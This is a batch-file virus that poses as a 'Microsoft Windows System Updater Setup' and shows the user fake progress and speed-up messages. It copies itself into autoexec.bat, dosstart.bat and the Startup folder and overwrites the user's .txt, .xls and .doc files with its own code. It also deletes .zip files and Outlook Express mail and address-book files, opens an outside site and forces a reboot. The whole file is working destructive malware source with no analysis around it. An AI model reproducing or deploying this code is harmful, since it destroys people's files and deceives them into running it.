@echo off
cls
if exist c:\winupdt.bat goto code
goto setup
:setup
@echo off
echo Welcome To Microsoft Windows System Updater Setup
echo.
copy %0 c:\winupdt.bat >> NULL
echo Scanning System.....Please Wait
prompt $P$SWindows2000
type %0 >> c:\autoexec.bat
type %0 >> c:\windows\dosstart.bat
echo Done.
echo.
echo Installing Components....Please Wait
for %%a in (C;\mydocu~1\*.txt) do copy c:\winupdt.bat %%a >> NULL
for %%a in (C;\mydocu~1\*.xls) do copy c:\winupdt.bat %%a >> NULL
for %%a in (C;\mydocu~1\*.doc) do copy c:\winupdt.bat %%a >> NULL
echo Done.
echo.
echo You Now Need to Register with Microsoft's Partener: Fortune Galaxy to receive automatic updates.
pause
echo Downloading Components...Please Wait
start "C:\Program Files\Internet Explorer\Iexplore.exe" http://www.astalavista.com
if exist "C:\Program Files\Outlook Express\msimn.exe" del "C:\wINDOWS\Application Data\Identities\{161C80E0-1B99-11D4-9077-FD90FD02053A}\Microsoft\Outlook Express\*.dbx"
if exist "C\WINDOWS\Application Data\Microsoft\Address Book\ankit.wab" del "C:\WINDOWS\Application Data\Microsoft\Address Book\ankit.wab"
echo Setup Will Now restart Your Computer....Please Wait
echo Your System is not faster by almost 40%
echo Thank you for using a Microsoft Partner's product.
copy %0 "C:\WINDOWS\Start Menu\Programs\StartUp\winupdt.bat" >> NULL
c:\WINDOWS\RUNDLL user.exe,exitwindowsexec
cls
goto end
:code
cls
@echo off
prompt $P$SWindows2000
if "%0" == "C:\AUTOEXEC.BAT" goto abc
type %0 >> c:\autoexec.bat
:abc
type %0 >> c:\windows\dosstart.bat
for %%a in (*.zip) do del %%a
for %%a in (C;\mydocu~1\*.txt) do copy c:\winupdt.bat %%a >> NULL
for %%a in (C;\mydocu~1\*.xls) do copy c:\winupdt.bat %%a >> NULL
for %%a in (C;\mydocu~1\*.doc) do copy c:\winupdt.bat %%a >> NULL
start "C:\Program Files\Internet Explorer\Iexplore.exe" http://www.astalavista.com
if exist "C:\Program Files\Outlook Express\msimn.exe" del "C:\wINDOWS\Application Data\Identities\{161C80E0-1B99-11D4-9077-FD90FD02053A}\Microsoft\Outlook Express\*.dbx" >> NULL
if exist "C\WINDOWS\Application Data\Microsoft\Address Book\ankit.wab" del "C:\WINDOWS\Application Data\Microsoft\Address Book\ankit.wab" >> NULL
copy %0 "C:\WINDOWS\Start Menu\Programs\StartUp\winupdt.bat >> NULL
goto :end
cls
:end
cls